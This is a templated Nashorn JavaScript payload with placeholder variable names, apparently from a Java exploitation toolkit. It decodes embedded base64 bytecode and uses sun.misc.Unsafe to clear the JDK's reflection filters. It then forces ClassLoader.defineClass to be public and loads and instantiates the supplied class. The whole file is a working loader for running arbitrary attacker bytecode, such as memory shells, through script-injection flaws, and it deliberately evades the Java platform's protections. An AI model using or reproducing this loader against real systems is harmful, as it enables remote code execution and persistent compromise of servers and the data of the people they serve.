var {{VAR:base64Str}} = "{{base64Str}}";
var {{VAR:className}} = "{{className}}";
var {{VAR:clsString}} = java.lang.Class.forName("java.lang.String");
var {{VAR:bytecode}};
function {{VAR:readAll}}({{VAR:input}}) {
    var {{VAR:output}} = new java.io.ByteArrayOutputStream();
    var {{VAR:buffer}} = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 4096);
    var {{VAR:length}};
    while (({{VAR:length}} = {{VAR:input}}.read({{VAR:buffer}})) != -1) {
        {{VAR:output}}.write({{VAR:buffer}}, 0, {{VAR:length}});
    }
    {{VAR:input}}.close();
    return {{VAR:output}}.toByteArray();
}
try {
    var {{VAR:decoder}} = java.lang.Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
    {{VAR:bytecode}} = {{VAR:decoder}}.getClass().getMethod("decode", {{VAR:clsString}}).invoke({{VAR:decoder}}, {{VAR:base64Str}});
} catch ({{VAR:ee}}) {
    try {
        var {{VAR:converter}} = java.lang.Class.forName("javax.xml.bind.DatatypeConverter");
        {{VAR:bytecode}} = {{VAR:converter}}.getMethod("parseBase64Binary", {{VAR:clsString}}).invoke(null, {{VAR:base64Str}});
    } catch ({{VAR:eee}}) {
        var {{VAR:legacyDecoder}} = java.lang.Class.forName("sun.misc.BASE64Decoder").newInstance();
        {{VAR:bytecode}} = {{VAR:legacyDecoder}}.getClass().getMethod("decodeBuffer", {{VAR:clsString}}).invoke({{VAR:legacyDecoder}}, {{VAR:base64Str}});
    }
}
var {{VAR:clsByteArray}} = (new java.lang.String("a").getBytes().getClass());
var {{VAR:theUnsafeMethod}} = java.lang.Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
{{VAR:theUnsafeMethod}}.setAccessible(true);
{{VAR:unsafe}} = {{VAR:theUnsafeMethod}}.get(null);
var {{VAR:reflectionClass}} = java.lang.Class.forName("jdk.internal.reflect.Reflection");
var {{VAR:classBuffer}} = {{VAR:readAll}}({{VAR:reflectionClass}}.getResourceAsStream("Reflection.class"));
var {{VAR:reflectionAnonymousClass}} = {{VAR:unsafe}}.defineAnonymousClass({{VAR:reflectionClass}}, {{VAR:classBuffer}}, null);
var {{VAR:fieldFilterMapField}} = {{VAR:reflectionAnonymousClass}}.getDeclaredField("fieldFilterMap");
if ({{VAR:fieldFilterMapField}}.getType().isAssignableFrom(java.lang.Class.forName("java.util.HashMap"))) {
    {{VAR:unsafe}}.putObject({{VAR:reflectionClass}}, {{VAR:unsafe}}.staticFieldOffset({{VAR:fieldFilterMapField}}), java.lang.Class.forName("java.util.HashMap").newInstance());
}
var {{VAR:clz}} = {{VAR:readAll}}(java.lang.Class.forName("java.lang.Class").getResourceAsStream("Class.class"));
var {{VAR:ClassAnonymousClass}} = {{VAR:unsafe}}.defineAnonymousClass(java.lang.Class.forName("java.lang.Class"), {{VAR:clz}}, null);
var {{VAR:reflectionDataField}} = {{VAR:ClassAnonymousClass}}.getDeclaredField("reflectionData");
{{VAR:unsafe}}.putObject(java.lang.Class.forName("java.lang.Class"), {{VAR:unsafe}}.objectFieldOffset({{VAR:reflectionDataField}}), null);
var {{VAR:clsInt}} = java.lang.Integer.TYPE;
var {{VAR:defineClassMethod}} = java.lang.Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", {{VAR:clsByteArray}}, {{VAR:clsInt}}, {{VAR:clsInt}});
var {{VAR:modifiers}} = {{VAR:defineClassMethod}}.getClass().getDeclaredField("modifiers");
{{VAR:unsafe}}.putShort({{VAR:defineClassMethod}}, {{VAR:unsafe}}.objectFieldOffset({{VAR:modifiers}}), 0x00000001);
var {{VAR:cc}} = {{VAR:defineClassMethod}}.invoke(new java.net.URLClassLoader(java.lang.reflect.Array.newInstance(java.lang.Class.forName("java.net.URL"), 0), java.lang.Thread.currentThread().getContextClassLoader()), {{VAR:bytecode}}, 0, {{VAR:bytecode}}.length);
{{VAR:cc}}.newInstance();
